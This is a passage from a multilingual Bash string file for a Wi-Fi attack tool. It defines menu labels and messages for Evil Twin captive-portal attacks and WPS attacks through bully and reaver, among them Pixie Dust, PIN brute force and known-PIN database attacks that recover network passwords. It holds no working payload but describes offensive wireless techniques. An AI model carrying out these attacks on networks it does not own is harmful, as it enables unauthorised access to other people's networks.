	arr["GREEK",328]="Η μόνη επίθεση Evil Twin στην οποία δεν είναι απαραίτητο να έχετε επιπλέον διεπαφή με πρόσβαση στο διαδίκτυο είναι η επίθεση με captive portal. Εναλλακτικά, θα χρειαστείτε το: ${optional_tools_names[12]}"

	arr["ENGLISH",329]="It seems you have ${optional_tools_names[12]} installed. Script can continue..."
	arr["SPANISH",329]="Se ha comprobado que tienes instalado ${optional_tools_names[12]}. El script puede continuar..."
	arr["FRENCH",329]="${optional_tools_names[12]} correctement detecté. Le script peut continuer..."
	arr["CATALAN",329]="S'ha comprovat que tens instal·lat ${optional_tools_names[12]}. El script pot continuar..."
	arr["PORTUGUESE",329]="${optional_tools_names[12]} está instalado. O script pode continuar..."
	arr["RUSSIAN",329]="Судя по всему, ${optional_tools_names[12]} у вас установлена. Скрипт может продолжить..."
	arr["GREEK",329]="Φαίνεται πως το ${optional_tools_names[12]} είναι εγκατεστημένο. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",330]="At this point there are two options to prepare the captive portal. Either having an interface with internet access, or making a fake DNS using ${optional_tools_names[12]}"
	arr["SPANISH",330]="Llegados a este punto hay dos opciones para preparar el portal cautivo. O bien tenemos una interfaz con acceso a internet, o preparamos un falso DNS usando ${optional_tools_names[12]}"
	arr["FRENCH",330]="Le portail captif peut être déployé de deux manières. Soit en utilisant une interface avec accès internet, si il y en a une disponible. Soit avec un faux DNS crée à l'aide de ${optional_tools_names[12]}"
	arr["CATALAN",330]="Arribats a aquest punt hi ha dues opcions per preparar el portal captiu. O bé tenim una interfície amb accés a internet, o vam preparar un fals DNS utilitzant ${optional_tools_names[12]}"
	arr["PORTUGUESE",330]="Neste momento, existem duas opções para o portal cativo. Ou temos uma interface com acesso à internet, ou fazer um falso DNS usando ${optional_tools_names[12]}"
	arr["RUSSIAN",330]="На данном этапе у вас две опции для подготовки Перехватывающего Портала. Нужно или иметь сетевой интерфейс с Интернет-доступом, или создать фальшивый DNS используя ${optional_tools_names[12]}"
	arr["GREEK",330]="Σε αυτό το σημείο υπάρχουν δύο επιλογές για την προετοιμασία του captive portal. Να έχετε μία διεπαφή με πρόσβαση στο διαδίκτυο, ή να φιάξετε ψευδές DNS χρησιμοποιώντας το ${optional_tools_names[12]}"

	arr["ENGLISH",331]="${option_counter_back}.${spaceiface}Return to Evil Twin attacks menu"
	arr["SPANISH",331]="${option_counter_back}.${spaceiface}Volver al menú de ataques Evil Twin"
	arr["FRENCH",331]="${option_counter_back}.${spaceiface}Retour au menu d'attaques Evil Twin"
	arr["CATALAN",331]="${option_counter_back}.${spaceiface}Tornar al menú d'atacs Evil Twin"
	arr["PORTUGUESE",331]="${option_counter_back}.${spaceiface}Voltar ao menu de ataques Evil Twin"
	arr["RUSSIAN",331]="${option_counter_back}.${spaceiface}Вернуться в меню атак Злой Двойник"
	arr["GREEK",331]="${option_counter_back}.${spaceiface}Επιστροφή στο μενού επιθέσεων Evil Twin"

	arr["ENGLISH",332]="Language changed to Greek"
	arr["SPANISH",332]="Idioma cambiado a Griego"
	arr["FRENCH",332]="Le script sera maintenant en Grec"
	arr["CATALAN",332]="Idioma canviat a Grec"
	arr["PORTUGUESE",332]="Idioma alterado para Grego"
	arr["RUSSIAN",332]="Язык изменён на Греческий"
	arr["GREEK",332]="Η γλώσσα άλλαξε σε Ελληνικά"

	arr["ENGLISH",333]="8.  WPS attacks menu"
	arr["SPANISH",333]="8.  Menú de ataques WPS"
	arr["FRENCH",333]="8.  Menu d'attaques WPS"
	arr["CATALAN",333]="${pending_of_translation} 8.  Menú d'atacs WPS"
	arr["PORTUGUESE",333]="8.  Menu de ataques WPS"
	arr["RUSSIAN",333]="8.  Меню атак на WPS"
	arr["GREEK",333]="8.  Μενού επιθέσεων WPS"

	arr["ENGLISH",334]="WPS attacks menu"
	arr["SPANISH",334]="Menú de ataques WPS"
	arr["FRENCH",334]="Menu d'attaques WPS"
	arr["CATALAN",334]="${pending_of_translation} Menú d'atacs WPS"
	arr["PORTUGUESE",334]="Menu de ataques WPS"
	arr["RUSSIAN",334]="Меню атак на WPS"
	arr["GREEK",334]="Μενού επιθέσεων WPS"

	arr["ENGLISH",335]="Selected WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
	arr["SPANISH",335]="BSSID WPS seleccionado: ${pink_color}${wps_bssid}${normal_color}"
	arr["FRENCH",335]="BSSID WPS sélectionné: ${pink_color}${wps_bssid}${normal_color}"
	arr["CATALAN",335]="${pending_of_translation} BSSID WPS seleccionat: ${pink_color}${wps_bssid}${normal_color}"
	arr["PORTUGUESE",335]="BSSID WPS selecionado: ${pink_color}${wps_bssid}${normal_color}"
	arr["RUSSIAN",335]="Выбран WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"
	arr["GREEK",335]="Επιλεγμένο WPS BSSID: ${pink_color}${wps_bssid}${normal_color}"

	arr["ENGLISH",336]="Selected WPS channel: ${pink_color}${wps_channel}${normal_color}"
	arr["SPANISH",336]="Canal WPS seleccionado: ${pink_color}${wps_channel}${normal_color}"
	arr["FRENCH",336]="Canal WPS sélectionné: ${pink_color}${wps_channel}${normal_color}"
	arr["CATALAN",336]="${pending_of_translation} Canal WPS seleecionat: ${pink_color}${wps_channel}${normal_color}"
	arr["PORTUGUESE",336]="Canal WPS selecionado: ${pink_color}${wps_channel}${normal_color}"
	arr["RUSSIAN",336]="Выбран WPS канал: ${pink_color}${wps_channel}${normal_color}"
	arr["GREEK",336]="Επιλεγμένο WPS κανάλι: ${pink_color}${wps_channel}${normal_color}"

	arr["ENGLISH",337]="Selected WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- can't be used"
	arr["SPANISH",337]="ESSID WPS seleccionado: ${pink_color}${wps_essid}${blue_color} <- no se puede usar"
	arr["FRENCH",337]="ESSID WPS sélectionné: ${pink_color}${wps_essid}${blue_color} <- ne peut pas être utilisé"
	arr["CATALAN",337]="${pending_of_translation} ESSID WPS seleccionat: ${pink_color}${wps_essid}${blue_color} <- no es pot utilitzar"
	arr["PORTUGUESE",337]="ESSID WPS selecionado: ${pink_color}${wps_essid}${blue_color} <- não pode ser utilizada"
	arr["RUSSIAN",337]="Выбран WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- не может использоваться"
	arr["GREEK",337]="Επιλεγμένο WPS ESSID: ${pink_color}${wps_essid}${blue_color} <- δεν μπορεί να χρησιμοποιηθεί"

	arr["ENGLISH",338]="Selected WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
	arr["SPANISH",338]="ESSID WPS seleccionado: ${pink_color}${wps_essid}${normal_color}"
	arr["FRENCH",338]="ESSID WPS sélectionné: ${pink_color}${wps_essid}${normal_color}"
	arr["CATALAN",338]="${pending_of_translation} ESSID WPS seleccionat: ${pink_color}${wps_essid}${normal_color}"
	arr["PORTUGUESE",338]="ESSID WPS selecionado: ${pink_color}${wps_essid}${normal_color}"
	arr["RUSSIAN",338]="Выбран WPS ESSID: ${pink_color}${wps_essid}${normal_color}"
	arr["GREEK",338]="Επιλεγμένο WPS ESSID: ${pink_color}${wps_essid}${normal_color}"

	arr["ENGLISH",339]="Selected WPS BSSID: ${pink_color}None${normal_color}"
	arr["SPANISH",339]="BSSID WPS seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",339]="BSSID WPS sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",339]="${pending_of_translation} BSSID WPS seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",339]="BSSID WPS selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",339]="Выбран WPS BSSID: ${pink_color}Нет${normal_color}"
	arr["GREEK",339]="Επιλεγμένο WPS BSSID: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",340]="Selected WPS channel: ${pink_color}None${normal_color}"
	arr["SPANISH",340]="Canal WPS seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",340]="Canal WPS sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",340]="${pending_of_translation} Canal WPS seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",340]="Canal WPS selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",340]="Выбран WPS канал: ${pink_color}Нет${normal_color}"
	arr["GREEK",340]="Επιλεγμένο WPS κανάλι: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",341]="Selected WPS ESSID: ${pink_color}None${normal_color}"
	arr["SPANISH",341]="ESSID WPS seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",341]="ESSID WPS sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",341]="${pending_of_translation} ESSID WPS seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",341]="ESSID WPS selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",341]="Выбран WPS ESSID: ${pink_color}Нет${normal_color}"
	arr["GREEK",341]="Επιλεγμένο WPS ESSID: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",342]="Pixie Dust attack obtains PIN and password in seconds, but not all access points are affected"
	arr["SPANISH",342]="El ataque Pixie Dust obtiene el PIN y la clave en segundos, pero no todos los puntos de acceso son vulnerables a este ataque"
	arr["FRENCH",342]="${pending_of_translation} L'attaque Pixie Dust obtient le code PIN et le mot de passe en quelques secondes, mais les points d'accès ne sont pas tous vulnérables à cette attaque"
	arr["CATALAN",342]="${pending_of_translation} L'atac Pixie Dust obté el PIN i la clau en segons, però no tots els punts d'accés són vulnerables a aquest atac"
	arr["PORTUGUESE",342]="O ataque Pixie Dust recebe o PIN e senha em segundos, mas nem todos os pontos de acesso são vulneráveis a este ataque"
	arr["RUSSIAN",342]="Pixie Dust получает PIN и пароль за секунды, но не все точки доступа подвержены этой атаке"
	arr["GREEK",342]="Η επίθεση Pixie Dust αποκτά το PIN και τον κωδικό πρόσβασης σε δευτερόλεπτα, αλλά μερικά σημεία πρόσβασης δεν επηρεάζονται"

	arr["ENGLISH",343]="In order to success on any WPS based attack, you need good signal of target network. We might otherwise get false negatives"
	arr["SPANISH",343]="Para realizar cualquier ataque WPS es necesario tener una buena señal de la red objetivo. Si no, podríamos obtener falsos negativos"
	arr["FRENCH",343]="${pending_of_translation} Pour effectuer toute WPS attaque dont vous avez besoin d'un bon signe du réseau cible. Nous pourrions obtenir autrement faux négatifs"
	arr["CATALAN",343]="${pending_of_translation} Per realitzar qualsevol atac WPS cal tenir un bon senyal de la xarxa objectiu. Si no, podríem obtenir falsos negatius"
	arr["PORTUGUESE",343]="Para executar qualquer ataque WPS você precisa ter um bom sinal da rede alvo. Caso contrario você pode obter falsos negativos"
	arr["RUSSIAN",343]="Чтобы добиться успеха при любой WPS атаке, вам нужен хорошей сигнал целевой сети. В противном случае мы можем получить ложные срабатывания"
	arr["GREEK",343]="Για να εκτελεστεί επιτυχώς οποιαδήποτε επίθεση WPS, θα πρέπει να υπάρχει ισχυρό σήμα του δικτύου στόχου. Αλλιώς μπορεί να υπάρξουν ψευδώς αρνητικά αποτελέσματα"

	arr["ENGLISH",344]="Some access points can be blocked after failing some PIN connection attempts. It may vary depending on the access point"
	arr["SPANISH",344]="Algunos puntos de acceso se bloquean tras fallar cierto número de intentos de conexión por PIN. Puede variar dependiendo del punto de acceso"
	arr["FRENCH",344]="${pending_of_translation} Certains points d'accès sont bloqués après avoir raté un certain nombre de tentatives de connexion par code PIN. Elle peut varier en fonction du point d'accès"
	arr["CATALAN",344]="${pending_of_translation} Alguns punts d'accés es bloqueja després de fallar cert nombre d'intents de connexió per PIN. Pot variar depenent del punt d'accés"
	arr["PORTUGUESE",344]="Alguns pontos de acesso podem estar bloqueados depois de receber uma série de tentativas incorretas de conexão por PIN. Isso pode variar dependendo do ponto de acesso"
	arr["RUSSIAN",344]="Некоторые точки доступа блокируются после нескольких неудачных попыток подключения с PIN. Это зависит от конкретной точки доступа."
	arr["GREEK",344]="Μερικά σημεία πρόσβασης μπορεί να μπλοκαριστούν μετά από μερικές αποτυχημένες προσπάθειες σύνδεσης PIN. Μπορεί να διαφέρει ανάλογα με το σημείο πρόσβασης"

	arr["ENGLISH",345]="5.  (bully) Custom PIN association"
	arr["SPANISH",345]="5.  (bully) Asociación con PIN personalizado"
	arr["FRENCH",345]="5.  (bully) Association avec PIN personnalisé"
	arr["CATALAN",345]="${pending_of_translation} 5.  (bully) Associació amb PIN personalitzat"
	arr["PORTUGUESE",345]="5.  (bully) Associação com o PIN personalizado"
	arr["RUSSIAN",345]="5.  (bully) Ассоциация с персонализированным PIN"
	arr["GREEK",345]="5.  (bully) Σύνδεση με εξατομικευμένο PIN"

	arr["ENGLISH",346]="7.  (bully) Pixie Dust attack"
	arr["SPANISH",346]="7.  (bully) Ataque Pixie Dust"
	arr["FRENCH",346]="7.  (bully) Attaque Pixie Dust"
	arr["CATALAN",346]="${pending_of_translation} 7.  (bully) Atac Pixie Dust"
	arr["PORTUGUESE",346]="7.  (bully) Ataque Pixie Dust"
	arr["RUSSIAN",346]="7.  (bully) Атака Pixie Dust"
	arr["GREEK",346]="7.  (bully) Επίθεση Pixie Dust"

	arr["ENGLISH",347]="9.  (bully) Bruteforce PIN attack"
	arr["SPANISH",347]="9.  (bully) Ataque de fuerza bruta por PIN"
	arr["FRENCH",347]="9.  (bully) Attaque brute force PIN"
	arr["CATALAN",347]="${pending_of_translation} 9.  (bully) Atac de força bruta per PIN"
	arr["PORTUGUESE",347]="9.  (bully) Ataque de força bruta por PIN"
	arr["RUSSIAN",347]="9.  (bully) Атака перебором PIN"
	arr["GREEK",347]="9.  (bully) Επίθεση PIN με χρήση ωμής βίας"

	arr["ENGLISH",348]="11. (bully) Known PINs database based attack"
	arr["SPANISH",348]="11. (bully) Ataque basado en base de datos de PINs conocidos"
	arr["FRENCH",348]=" 11. (bully) Attaque en utilisant un PIN de la base de données"
	arr["CATALAN",348]="${pending_of_translation} 11. (bully) Atac basat en base de dades de PINs coneguts"
	arr["PORTUGUESE",348]="11. (bully) Ataque com base em banco de dados de PINs conhecidos"
	arr["RUSSIAN",348]="11. (bully) Атака на основе базы данных известных PIN"
	arr["GREEK",348]="11. (bully) Επίθεση με χρήση γνωστής βάσης δεδομένων PIN"

	arr["ENGLISH",349]="  N.         BSSID      CHANNEL  PWR   LOCKED  ESSID"
	arr["SPANISH",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
	arr["FRENCH",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
	arr["CATALAN",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
	arr["PORTUGUESE",349]="  N.         BSSID        CANAL  PWR   LOCKED  ESSID"
	arr["RUSSIAN",349]="  N.         BSSID      CHANNEL  PWR   LOCKED  ESSID"
	arr["GREEK",349]="  N.         BSSID      CHANNEL  PWR   LOCKED  ESSID"

	arr["ENGLISH",350]="${blue_color}You have selected a locked WPS network ${green_color}Do you want to continue? ${normal_color}[y/n]"
	arr["SPANISH",350]="${blue_color}Has seleccionado una red WPS bloqueada ${green_color}¿Deseas continuar? ${normal_color}[y/n]"
	arr["FRENCH",350]="${blue_color}Vous avez sélectionné un réseau dont le WPS est bloqué ${green_color}Voulez-vous continuer? ${normal_color}[y/n]"
	arr["CATALAN",350]="${pending_of_translation} ${blue_color}Has seleccionat una xarxa WPS bloquejada ${green_color}¿Vols continuar? ${normal_color}[y/n]"
	arr["PORTUGUESE",350]="${blue_color}Você selecionou uma rede com WPS bloqueado ${green_color}Você deseja continuar? ${normal_color}[y/n]"
	arr["RUSSIAN",350]="${blue_color}Вы выбрали заблокированную WPS сеть ${green_color}Вы хотите продолжить? ${normal_color}[y/n]"
	arr["GREEK",350]="${blue_color}Έχετε επιλέξει ένα κλειδωμένο WPS δίκτυο ${green_color}Θέλετε να συνεχίσετε; ${normal_color}[y/n]"

	arr["ENGLISH",351]="WPS locked network: ${pink_color}${wps_locked}${normal_color}"
	arr["SPANISH",351]="Red WPS bloqueada: ${pink_color}${wps_locked}${normal_color}"
	arr["FRENCH",351]="Blocage du WPS: ${pink_color}${wps_locked}${normal_color}"
	arr["CATALAN",351]="${pending_of_translation} Xarxa WPS bloquejada: ${pink_color}${wps_locked}${normal_color}"
	arr["PORTUGUESE",351]="Rede com WPS bloqueado: ${pink_color}${wps_locked}${normal_color}"
	arr["RUSSIAN",351]="Сеть с заблокированным WPS: ${pink_color}${wps_locked}${normal_color}"
	arr["GREEK",351]="Κλειδωμένο WPS δίκτυο: ${pink_color}${wps_locked}${normal_color}"

	arr["ENGLISH",352]="WPS locked network: ${pink_color}None${normal_color}"
	arr["SPANISH",352]="Red WPS bloqueada: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",352]="Blocage du WPS: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",352]="${pending_of_translation} Xarxa WPS bloquejada: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",352]="rede com WPS bloqueado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",352]="Сеть с заблокированным WPS: ${pink_color}Нет${normal_color}"
	arr["GREEK",352]="Κλειδωμένο WPS δίκτυο: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",353]="Checking to solve possible \"bad FCS\" problem if exists. Parameterizing..."
	arr["SPANISH",353]="Realizando una pequeña prueba para solventar el posible problema de \"bad FCS\" si existiese. Parametrizando..."
	arr["FRENCH",353]="${pending_of_translation} Faire un petit test pour résoudre le problème possible de \"bad FCS\" si. Paramétrage..."
	arr["CATALAN",353]="${pending_of_translation} Mitjançant una petita prova per solucionar el possible problema de \"bad FCS\" si existís. Parametritzant..."
	arr["PORTUGUESE",353]="Fazendo alguns teste para resolver o possível problema \"bad FCS\". Definindo parâmetro..."
	arr["RUSSIAN",353]="Проверка возможного решения проблемы \"плохого FCS (контроля последовательности кадров)\" если она существует. Параметризация..."
	arr["GREEK",353]="Γίνεται έλεγχος επίλυσης πιθανού σφάλματος \"bad FCS\" αν υπάρχει. Γίνεται παραμετροποίηση..."

	arr["ENGLISH",354]="Done! parameter set"
	arr["SPANISH",354]="Hecho! parámetro fijado"
	arr["FRENCH",354]="Paramètres définis!"
	arr["CATALAN",354]="${pending_of_translation} Fet! paràmetre fixat"
	arr["PORTUGUESE",354]="Feito! parâmetro definido"
	arr["RUSSIAN",354]="Сделано! параметры заданы"
	arr["GREEK",354]="Έγινε! η παράμετρος τέθηκε"

	arr["ENGLISH",355]="It seems this interface was parametrized before. It's not necessary to check again"
	arr["SPANISH",355]="Esta interfaz ya fue parametrizada anteriormente. No es necesario realizar de nuevo el chequeo"
	arr["FRENCH",355]="${pending_of_translation} Cette interface a déjà été configuré précédemment. Il est nécessaire de vérifier à nouveau"
	arr["CATALAN",355]="${pending_of_translation} Aquesta interfície ja va ser parametritzada anteriorment. No cal fer de nou la revisió"
	arr["PORTUGUESE",355]="Esta interface já foi configurada anteriormente. Não é necessário verificar novamente"
	arr["RUSSIAN",355]="Кажется, этот интерфейс был параметризован ранее. Нет необходимости проверять снова"
	arr["GREEK",355]="Φαίνεται πως αυτή η διεπαφή παραμετροποιήθηκε προηγουμένως. Δεν είναι απαραίτητο να γίνει έλεγχος ξανά"

	arr["ENGLISH",356]="Some combinations don't work well. Such as reaver and Ralink chipset cards. If your card has this chipset is recommended to use bully"
	arr["SPANISH",356]="Algunas combinaciones no funcionan bien. Como por ejemplo reaver y las tarjetas con chipset Ralink. Si tu tarjeta tiene este chipset es mejor utilizar bully"
	arr["FRENCH",356]="${pending_of_translation} Certaines combinaisons ne fonctionnent pas bien. Tels que reaver et cartes avec Ralink chipset. Si votre carte a ce chipset est préférable d'utiliser bully"
	arr["CATALAN",356]="${pending_of_translation} Algunes combinacions no funcionan bé. Com per exemple reaver i les targetes amb chipset Ralink. Si la teva targeta té aquest chipset és millor utilitzar bully"
	arr["PORTUGUESE",356]="Algumas combinações não funcionam bem. Tais como reaver e placas de rede com chipset Ralink. Se o sua placa de rede tem este chipset é melhor usar bully"
	arr["RUSSIAN",356]="Некоторые комбинации не работают нормально. К примеру reaver и карты с чипсетом Ralink. Если ваша карта имеет этот чипсет, то рекомендуется использовать bully"
	arr["GREEK",356]="Μερικοί συνδυασμοί δεν λειτουργούν καλά. Όπως για παράδειγμα το reaver με κάρτες που έχουν Ralink chipset. Αν η κάρτα σας έχει αυτό το chipset είναι προτιμότερο να χρησιμοποιήσετε το bully"

	arr["ENGLISH",357]="6.  (reaver) Custom PIN association"
	arr["SPANISH",357]="6.  (reaver) Asociación con PIN personalizado"
	arr["FRENCH",357]="${pending_of_translation} 6.  (reaver) Association avec le code PIN personnalisé"
	arr["CATALAN",357]="${pending_of_translation} 6.  (reaver) Associació amb PIN personalitzat"
	arr["PORTUGUESE",357]="6.  (reaver) Associação com o PIN personalizado"
	arr["RUSSIAN",357]="6.  (reaver) Пользовательские PIN ассоциации"
	arr["GREEK",357]="6.  (reaver) Σύνδεση με εξατομικευμένο PIN"

	arr["ENGLISH",358]="8.  (reaver) Pixie Dust attack"
	arr["SPANISH",358]="8.  (reaver) Ataque Pixie Dust"
	arr["FRENCH",358]="${pending_of_translation} 8.  (reaver) Attaque Pixie Dust"
	arr["CATALAN",358]="${pending_of_translation} 8.  (reaver) Atac Pixie Dust"
	arr["PORTUGUESE",358]="8.  (reaver) Ataque Pixie Dust"
	arr["RUSSIAN",358]="8.  (reaver) Атака Pixie Dust"
	arr["GREEK",358]="8.  (reaver) Επίθεση Pixie Dust"

	arr["ENGLISH",359]="10. (reaver) Bruteforce PIN attack"
	arr["SPANISH",359]="10. (reaver) Ataque de fuerza bruta por PIN"
	arr["FRENCH",359]="${pending_of_translation} 10. (reaver) Attaque de force brute PIN"
	arr["CATALAN",359]="${pending_of_translation} 10. (reaver) Atac de força bruta per PIN"
	arr["PORTUGUESE",359]="10. (reaver) Ataque de força bruta por PIN"
	arr["RUSSIAN",359]="10. (reaver) Атака перебором PIN"
	arr["GREEK",359]="10. (reaver) Επίθεση PIN με χρήση ωμής βίας"

	arr["ENGLISH",360]="12. (reaver) Known PINs database based attack"
	arr["SPANISH",360]="12. (reaver) Ataque basado en base de datos de PINs conocidos"
	arr["FRENCH",360]="${pending_of_translation} 12. (reaver) Sur la base base de données d'attaque PINs connus"
	arr["CATALAN",360]="${pending_of_translation} 12. (reaver) Atac basat en base de dades de PINs coneguts"
	arr["PORTUGUESE",360]="12. (reaver) Ataque com base em banco de dados de PINs conhecidos"
	arr["RUSSIAN",360]="12. (reaver) Атака на основе базы данных известных PIN"
	arr["GREEK",360]="12. (reaver) Επίθεση με χρήση γνωστής βάσης δεδομένων PIN"

	arr["ENGLISH",361]="13.  Return to main menu"
	arr["SPANISH",361]="13.  Volver al menú principal"
	arr["FRENCH",361]="13.  Retourner au menu principal"
	arr["CATALAN",361]="13.  Tornar al menú principal"
	arr["PORTUGUESE",361]="13.  Voltar ao menu principal"
	arr["RUSSIAN",361]="13.  Возврат в главное меню"
	arr["GREEK",361]="13.  Επιστροφή στο αρχικό μενού"

	arr["ENGLISH",362]="Custom PIN set to ${normal_color}${custom_pin}"
	arr["SPANISH",362]="PIN personalizado elegido ${normal_color}${custom_pin}"
	arr["FRENCH",362]="${pending_of_translation} PIN personnalisé choisi ${normal_color}${custom_pin}"
	arr["CATALAN",362]="${pending_of_translation} PIN personalitzat triat ${normal_color}${custom_pin}"
	arr["PORTUGUESE",362]="PIN personalizado escolhido ${normal_color}${custom_pin}"
	arr["RUSSIAN",362]="Пользовательский PIN установлен на ${normal_color}${custom_pin}"
	arr["GREEK",362]="Το εξατομικευμένο PIN τέθηκε σε ${normal_color}${custom_pin}"

	arr["ENGLISH",363]="Type custom PIN :"
	arr["SPANISH",363]="Escribe el PIN personalizado :"
	arr["FRENCH",363]="${pending_of_translation} Écrivez PIN personnalisé :"
	arr["CATALAN",363]="${pending_of_translation} Escriu el PIN personalitzat :"
	arr["PORTUGUESE",363]="Escreva o ESSID do alvo :"
	arr["RUSSIAN",363]="Напишите пользовательский PIN :"
	arr["GREEK",363]="Πληκτρολογήστε εξατομικευμένο PIN :"

	arr["ENGLISH",364]="BSSID set to ${normal_color}${wps_bssid}"
	arr["SPANISH",364]="BSSID elegido ${normal_color}${wps_bssid}"
	arr["FRENCH",364]="Le BSSID choisi est ${normal_color}${wps_bssid}"
	arr["CATALAN",364]="El BSSID escollit ${normal_color}${wps_bssid}"
	arr["PORTUGUESE",364]="BSSID escolhido ${normal_color}${wps_bssid}"
	arr["RUSSIAN",364]="BSSID установлена на ${normal_color}${wps_bssid}"
	arr["GREEK",364]="Το BSSID τέθηκε σε ${normal_color}${wps_bssid}"

	arr["ENGLISH",365]="Channel set to ${normal_color}${wps_channel}"
	arr["SPANISH",365]="Canal elegido ${normal_color}${wps_channel}"
	arr["FRENCH",365]="Le canal ${normal_color}${wps_channel}${blue_color} a été choisi"
	arr["CATALAN",365]="El canal ${normal_color}${wps_channel}${blue_color} s'ha escollit"
	arr["PORTUGUESE",365]="Canal ${normal_color}${wps_channel}${blue_color} selecionado"
	arr["RUSSIAN",365]="Канал установлен на ${normal_color}${wps_channel}"
	arr["GREEK",365]="Το κανάλι ${normal_color}${wps_channel}${blue_color} έχει επιλεχθεί"

	arr["ENGLISH",366]="After stopping the attack (using [Ctrl+C]), the window will not be closed automatically. So you'll have time to write down the password if successful. You'll have to close it manually"
	arr["SPANISH",366]="Tras parar el ataque (usando [Ctrl+C]), la ventana del ataque no se cerrará automáticamente. Asi tendrás tiempo de anotar la contraseña en caso de tener éxito. Tendrás que cerrarla manualmente"
	arr["FRENCH",366]="${pending_of_translation} Après l'arrêt de l'attaque (en utilisant [Ctrl+C]), la fenêtre ne se ferme pas automatiquement attaque. Donc, avoir le temps d'écrire le mot de passe en cas de succès. Vous devez fermer manuellement"
	arr["CATALAN",366]="${pending_of_translation} Després parar l'atac (usant [Ctrl+C]), la finestra de l'atac no es tancarà automàticament. Així tindràs temps d'anotar la contrasenya en cas de tenir èxit. Hauràs de tancar-la manualment"
	arr["PORTUGUESE",366]="Depois de parar o ataque (usando [Ctrl+C]), a janela não será fechada automaticamente. Então temos tempo para anotar a senha em caso ela tenha sido obtida. Em seguida você vai ter que fechar a janela manualmente"
	arr["RUSSIAN",366]="После остановки атаки (используя [Ctrl+C]), окно автоматически не закроется. У вас будет время переписать пароль, если атака завершилась успешно. Затем вам нужно закрыть его вручную"
	arr["GREEK",366]="Μετά τη διακοπή της επίθεσης (με [Ctrl+C]), το παράθυρο δεν θα κλείσει αυτόματα. Έτσι θα έχετε χρόνο να κρατήσετε τον κωδικό πρόσβασης σε περίπτωση επιτυχίας. Το παράθυρο θα πρέπει να το κλείσετε χειροκίνητα"

	arr["ENGLISH",367]="You have bully installed (v${bully_version}), but not required version. To perform Pixie Dust integrated bully attack you must have at least version v${minimum_bully_pixiewps_version}"
	arr["SPANISH",367]="Tienes bully instalado (v${bully_version}), aunque no la versión requerida. Para realizar el ataque Pixie Dust integrado con bully has de tener al menos la versión v${minimum_bully_pixiewps_version}"
	arr["FRENCH",367]="${pending_of_translation} Vous bully installé (v${bully_version}), mais pas la version requise. Pour rendre l'attaque bully intégrée Pixie Dust doit avoir au moins la version v${minimum_bully_pixiewps_version}"
	arr["CATALAN",367]="${pending_of_translation} Tens bully instal·lat (v${bully_version}), encara que no la versió requerida. Per realitzar l'atac Pixie Dust integrat amb bully has de tenir almenys la versió v${minimum_bully_pixiewps_version}"
	arr["PORTUGUESE",367]="Você tem o bully instalado (v${bully_version}), mas não a versão necessária. Para fazer o ataque Pixie Dust com bully você precisa ter pelo menos a versão v${minimum_bully_pixiewps_version}"
	arr["RUSSIAN",367]="У вас установлен bully (v${bully_version}), но не та версия, которая требуется. Для выполнения интегрированной в bully атаки Pixie Dust у вас должна быть по крайне мере версия v${minimum_bully_pixiewps_version}"
	arr["GREEK",367]="Έχετε εγκατεστημένο το bully (v${bully_version}), αλλά όχι την απαιτούμενη έκδοση. Για να κάνετε την επίθεση Pixie Dust με ενσωματωμένο bully θα πρέπει να έχετε τουλάχιστον την έκδοση v${minimum_bully_pixiewps_version}"

	arr["ENGLISH",368]="You have bully installed (v${bully_version}). You meet the version requirement to perform Pixie Dust integrated bully attack (minimum version v${minimum_bully_pixiewps_version}). Script can continue..."
	arr["SPANISH",368]="Tienes bully instalado (v${bully_version}). Cumples con el requisito de versión para realizar el ataque Pixie Dust integrado con bully (versión mínima v${minimum_bully_pixiewps_version}). El script puede continuar..."
	arr["FRENCH",368]="${pending_of_translation} Vous bully installé (v${bully_version}). Vous répondez aux exigences de version pour le Pixie Dust intégré attaque bully (version minimale v${minimum_bully_pixiewps_version}). Le script peut continuer..."
	arr["CATALAN",368]="${pending_of_translation} Tens bully instal·lat (v${bully_version}). Compleixes amb el requisit de versió per a realitzar l'atac Pixie Dust integrat amb bully (versió mínima v${minimum_bully_pixiewps_version}). El script pot continuar..."
	arr["PORTUGUESE",368]="Você tem o bully instalado (v${bully_version}). Você cumpre a exigência de versão para o ataque Pixie Dust com bully (versão mínima v${minimum_bully_pixiewps_version}). O script pode continuar..."
	arr["RUSSIAN",368]="У вас установлен bully (v${bully_version}). Версия удовлетворяет требованиям для проведения интегрированной в bully атаки Pixie Dust (минимальная версия v${minimum_bully_pixiewps_version}). Скрипт может продолжить работу..."
	arr["GREEK",368]="Έχετε εγκατεστημένο το bully (v${bully_version}). Έχετε την απαραίτητη έκδοση bully (ελάχιστη έκδοση v${minimum_bully_pixiewps_version}), για την επίθεση Pixie Dust με ενσωματωμένο bully. Το script μπορεί να συνεχίσει..."

